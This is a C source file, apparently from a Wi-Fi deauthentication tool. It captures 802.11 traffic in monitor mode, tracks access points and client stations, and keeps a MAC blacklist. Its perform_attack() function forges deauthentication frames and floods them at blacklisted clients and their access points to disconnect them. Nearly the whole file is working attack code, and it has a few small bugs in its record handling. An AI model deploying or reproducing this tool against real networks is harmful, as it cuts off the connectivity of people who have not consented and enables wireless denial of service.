/*
 * Copyright (c) 2016 Emanuele Faranda <black.silver@hotmail.it>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 *
 */

#include "internals.h"

#include <stdio.h>
#include <string.h>

#include <unistd.h>
#include "util.h"
#include "debug.h"

/**************************************************************************/

// Buffer used for reads; contains the radiotap header
static u_char h80211_rdbuf[BUF_LEN];
// Buffer used for writes
static u_char h80211_wrbuf_headed[BUF_LEN];
// Offset in h80211_buffer for writes; excludes the radiotap header
static u_char * h80211_wrbuf;

pcap_t * capdev = NULL;
static const u_char llcnull[4] = {0, 0, 0, 0};

// We use a fixed radiotap header for deauth
static u_char RadiotapHeader[] = {
    0x00, 0x00, // <-- radiotap version
    RADIOTAP_WR_LEN, 0x00, // <- radiotap header length (in bytes)
    0x04, 0x80, 0x00, 0x00, // <-- bitmap
    0x6c, // <-- rate (in 500kbps units) = 54 Mbps
    0x00, // <-- padding for natural alignment
    0x18, 0x00, // <-- TX flags
};

static int send_wrbuf(size_t datacount)
{
    if (pcap_sendpacket(capdev, h80211_wrbuf_headed, datacount + RADIOTAP_WR_LEN) < 0)
        return -1;
    return 0;
}

static int ssid_in_list_fn(const void * item, const void * macaddr) {
    struct ssid_record * host = (struct ssid_record * )item;
    return memcmp(host->ssid, macaddr, 6);
}

/**************************************************************************/

GSList * blacklist = NULL;
GSList * attacking = NULL;
const u_char NULL_MAC[6] = {0};

int init_internals(const char * ifname) {
    char errbuf[PCAP_ERRBUF_SIZE] = {0};

    capdev = pcap_open_live(ifname, SNAPLEN, 1, READ_TIMEOUT, errbuf);
    if (capdev == NULL) {
        fprintf(stderr, "Cannot open monitor interface: %s\n", errbuf);
        return -1;
    } else if (errbuf[0] != 0) {
        fprintf(stderr, "pcap_open_live() warning: %s\n", errbuf);
    }

    /* drop privileges */
    if (setuid(getuid()) == -1)
		perror("setuid");

    // Init buffers
    memcpy(h80211_wrbuf_headed, RadiotapHeader, RADIOTAP_WR_LEN);
    h80211_wrbuf = h80211_wrbuf_headed + RADIOTAP_WR_LEN;

    if (init_model() < 0)
        return -1;

    return 0;
}

int destroy_internals() {
    destroy_model();
    g_slist_free_full(blacklist, free_fn);
    g_slist_free(attacking);

    pcap_close(capdev);
    return 0;
}

/* Reads a packet from the capture capdevice into h80211_rdbuf.
 *  Returns -1 on error;
 *  Returns 0 on timeout or 0 read;
 *  Returns >0 number of data (not radiotap) bytes read and sets dataptr to
 *    point to the data (skips radiotap headers)
 *
 */
int read_packet(const u_char ** dataptr) {
    //fprintf(stderr, "READing %u bytes\n", count);
    struct pcap_pkthdr * h;
    const u_char * data;

    switch(pcap_next_ex(capdev, &h, &data)) {
        case 1:
            /* ok */
            break;
        case 0:
            //~ fprintf(stderr, "Timeout\n");
            return 0;
        case -1:
            pcap_perror(capdev, "Error while reading the packet");
            return -1;
        case -2:
            fprintf(stderr, "Savefile end\n");
            return 0;
        default:
            fprintf(stderr, "Unknown error\n");
            return -1;
    }

    if (h->caplen < 0x0c || ((u_int16_t)data[0] != 0x0000)) {
        //~ fprintf(stderr, "Radiotap header not found or unknown version\n");
        return 0;
    }

    if (h->caplen > BUF_LEN) {
        fprintf(stderr, "Insufficient buffer size!\n");
        return -1;
    }

    memcpy(h80211_rdbuf, data, h->caplen);

    const u_char radiolen = data[2];
    const size_t datalen = h->caplen - radiolen;

    *dataptr = h80211_rdbuf + radiolen;
    return datalen;
}

/* Sends DEAUTH_DIRECTED packets, to the station then to the host, foreach attacking host */
void perform_attack() {
    struct ieee80211_mgmt * dehdr = (struct ieee80211_mgmt*) h80211_wrbuf;
    dehdr->frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT, WLAN_FC_STYPE_DEAUTH);
    dehdr->duration = 0x013a;
    dehdr->seq_ctrl = 0x0;
    dehdr->u.disassoc.reason_code = WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA;
    (*dehdr->u.disassoc.variable) = 0x0;

    time_t now = time(0);
    GSList * current = attacking;
    GSList * prev = NULL;

    while(current && (now - ((struct ssid_record *)current->data)->ldeauth) >= DEAUTH_INTERVAL) {
        //~ printf("Phase I: AP -> station\n");
        struct ssid_record * target = (struct ssid_record *) current->data;
        u_char * mac = target->ssid;

        if (memcmp(target->assoc, NULL_MAC, 6) != 0) {
            memcpy(dehdr->bssid, target->assoc, 6);
            memcpy(dehdr->sa, target->assoc, 6);
            memcpy(dehdr->da, target->ssid, 6);

            printf("Sending %d directed DeAuth. STMAC:"
              " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
              DEAUTH_DIRECTED, mac[0],  mac[1],
              mac[2],  mac[3], mac[4],  mac[5]);

            for(int i = 0; i < DEAUTH_DIRECTED; i++)
                send_wrbuf(26);
        }

        prev = current;
        current = current->next;
    }

    for (GSList * st = attacking; st != current; st = st->next) {
        //~ printf("Phase II: station -> AP\n");
        struct ssid_record * target = (struct ssid_record *) st->data;

        if (memcmp(target->assoc, NULL_MAC, 6) != 0) {
            memcpy(dehdr->bssid, target->assoc, 6);
            memcpy(dehdr->sa, target->ssid, 6);
            memcpy(dehdr->da, target->assoc, 6);

            for(int i = 0; i < DEAUTH_DIRECTED; i++)
                send_wrbuf(26);

            target->ldeauth = now;
        }
    }

    if (current && prev) {
        // from head to bottom in the queue
        g_slist_last(attacking)->next = attacking;
        prev->next = NULL;
        attacking = current;
    }
}

void pckdata_handler(const u_char * data, size_t len, const struct pcap_pkthdr * h) {
    //~ printf("Got packet: %u bytes\n", len);

    const u_char * bssid;
    const u_char * station;

    // filter bad packets (from airodump-ng.c source):
    //      skip packets smaller than a 802.11 header
    if(len < 24)
        return;
    // skip (uninteresting) control frames -> Removes a TON of frames!
    if((data[0] & 0x0C) == 0x04)
        return;
    // if it's a LLC null packet, just forget it
    if (len > 28 && memcmp(data + 24, llcnull, 4) == 0)
        return;
    // END filter bad packets

    struct ieee80211_hdr * header = (struct ieee80211_hdr *) data;

    get_bssid_and_station(header, &bssid, &station);
    time_t now = time(0);

    if (bssid) {
        struct bssid_record *  bssrec = ap_lookup(bssid);
        if (! bssrec) {
            bssrec = ap_create(bssid);
            bssrec->ssid.fseen = now;
            if (! bssrec)
                fprintf(stderr, "ap_create() error: cannot allocate new host\n");

            printf("New bssid: %s\n", bssrec->ssid.ssid_s);
        }

        // is a beacon frame?
        if (data[0] == 0x80 && bssrec->essid[0] == 0) {
            struct ieee802_11_elems elems;
            struct ieee80211_mgmt * frame = (struct ieee80211_mgmt *)header;
            const size_t elen = len - (frame->u.beacon.variable - data);

            if (ieee802_11_parse_elems(frame->u.beacon.variable, elen, &elems, 0) != ParseFailed &&
              elems.ssid_len > 0) {
                const size_t count = elems.ssid_len < (SSID_MAX_SIZE-1) ? elems.ssid_len : (SSID_MAX_SIZE-1);
                strncpy(bssrec->essid, (char *)elems.ssid, count);
                bssrec->essid[count] = '\0';
            }
        }

        // TODO only set this if AP is the transmitter
        bssrec->ssid.lseen = now;
    }

    if (station) {
        struct ssid_record * host = g_hash_table_lookup(hosts, station);

        if(! host) {
            host = host_create(station);
            if (! host)
                return;

            printf("New host: %s\n", host->ssid_s);
            // unassociated
            //ap_add_host(NULL_MAC, host);
        }

        if (bssid && memcmp(host->assoc, bssid, 6) != 0) {
            if (memcmp(host->assoc, NULL_MAC, 6) != 0)
                // host changed association
                ap_remove_host(host->assoc, host);

            memcpy(host->assoc, bssid, 6);
            ap_add_host(host->assoc, host);

            int toattack = 0;
            if (g_slist_find_custom(blacklist, host->ssid, ssid_in_list_fn))
                toattack = 1;
            else if (g_slist_find_custom(blacklist, bssid, ssid_in_list_fn))
                toattack = 1;
            int inlist = g_slist_find(attacking, host) != NULL;

            if (toattack && !inlist)
                attacking = g_slist_insert(attacking, host, 0);
            else if (!toattack && inlist)
                attacking = g_slist_remove(attacking, host);
        }

        host->lseen = now;
        //~ debug_print_bssids(aps, whois);
    }
}

int host_blacklist(u_char host[6]) {
    GSList * found = g_slist_find_custom(blacklist, host, ssid_in_list_fn);

    if (found)
        return -1;

    u_char * mac = (u_char *) malloc(6);
    memcpy(mac, host, 6);
    blacklist = g_slist_append(blacklist, mac);

    // check if it must be attacked now
    if (! g_slist_find_custom(attacking, mac, ssid_in_list_fn)) {
        struct ssid_record * rec = (struct ssid_record *) g_hash_table_lookup(hosts, mac);

        if (rec)
            attacking = g_slist_insert(attacking, mac, 0);
    }

    return 0;
}

int host_unblacklist(u_char host[6]) {
    GSList * link = g_slist_find_custom(blacklist, host, ssid_in_list_fn);
    if (! link)
        return -1;

    free(link->data);
    blacklist = g_slist_delete_link(blacklist, link);

    // check if it's being attacked
    GSList * atlink = g_slist_find_custom(attacking, host, ssid_in_list_fn);
    if (atlink)
        attacking = g_slist_delete_link(attacking, atlink);
    return 0;
}
